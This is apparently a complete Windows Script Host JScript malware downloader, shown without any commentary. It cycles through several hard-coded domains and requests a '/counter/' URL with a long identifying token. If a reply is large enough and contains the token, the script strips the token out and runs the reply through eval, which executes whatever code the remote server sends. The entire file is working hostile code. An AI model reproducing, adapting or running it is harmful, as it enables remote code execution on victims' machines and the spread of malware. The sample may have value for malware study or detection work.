

var x = "delta.truecompassdesigns.net live2live.me online-web-typing.com irma.truecompassdesigns.net omegaministrygroup.com".split(" ");
var m = "0000001BbbaUnnYSnHQB5yZQDZ14d9m5rE24bey7rXB4aOypfKIVYElgCI0fndm9BW_vR03h-PFz10hrHVU_Z_95JkeNLInDJdtUeDH8__Fnd8R8WKdldhBl";
for (var i=0; i<x.length; i++)
{
	var e = WScript.CreateObject("MSXML2.XMLHTTP");	
	try
	{
		var ter = '/';
		e.open('GET', 
		"http"+"://"+x[i]+ter+"counter/?"+m,
		
		false);
		e.send();

		var r = e.responseText;

		if (r.length > 1000 && r.indexOf(m) > -1)
		{
			eval(e.responseText.split(m).join("a"));

			break;
		};
	}
	catch(e)
	{
	};
};